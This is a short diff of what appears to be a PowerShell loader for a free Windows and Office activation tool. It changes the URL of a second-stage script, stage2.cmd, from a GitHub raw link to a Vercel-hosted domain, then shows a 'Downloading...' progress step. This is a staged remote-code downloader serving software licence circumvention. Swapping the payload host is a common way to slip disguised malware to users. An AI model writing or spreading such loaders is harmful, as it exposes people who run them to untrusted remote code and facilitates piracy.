@@ -49,7 +49,7 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     $URLs = @(
-        'https://raw.githubusercontent.com/CodewithMubasher/activate-windows-and-office-free/refs/heads/main/stage2.cmd'
+        'https://activate-windows-and-office-free.vercel.app/stage2.cmd'
     )
 
     Write-Progress -Activity "Downloading..." -Status "Please wait"
